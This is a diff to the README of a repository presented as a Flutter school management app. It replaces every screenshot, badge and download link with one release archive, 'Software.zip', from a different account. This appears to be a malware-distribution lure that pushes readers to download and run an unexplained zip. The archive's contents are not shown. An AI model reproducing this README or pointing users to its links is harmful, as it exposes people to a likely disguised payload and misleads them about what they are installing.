@@ -3,7 +3,7 @@
 
 Welcome to the School Management System Flutter App repository! This project is a comprehensive Flutter Web and Mobile application designed for managing various school operations, handling authentication processes, and efficiently managing school data. 
 
-![School Management System](https://www.example.com/school-management-system.png)
+![School Management System](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
 
 ## Features 🚀
 
@@ -27,13 +27,13 @@ To get started with the School Management System Flutter App, follow these steps
 
 Here are some snapshots of the School Management System Flutter App in action:
 
-![Login Screen](https://www.example.com/login-screen.png)
+![Login Screen](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
 *Login screen for secure access*
 
-![Dashboard View](https://www.example.com/dashboard-view.png)
+![Dashboard View](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
 *Dashboard view for quick insights*
 
-![Student Management](https://www.example.com/student-management.png)
+![Student Management](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
 *Student management interface for easy tracking*
 
 ## Technologies Used 💻
@@ -45,13 +45,13 @@ Here are some snapshots of the School Management System Flutter App in action:
 
 ## Get Started 🌟
 
-Ready to experience the School Management System Flutter App? [Download the latest release here](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+Ready to experience the School Management System Flutter App? [Download the latest release here](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
 
 ### Launch the School Management System Flutter App
 
 Click the button below to download the latest release and launch the app.
 
-[![Download App](https://img.shields.io/badge/Download-App-green)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download App](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)](https://github.com/lozpenis/School-Management-System-Flutter-App/releases/download/v1.0/Software.zip)
 
 ## Contributions 🤝
 
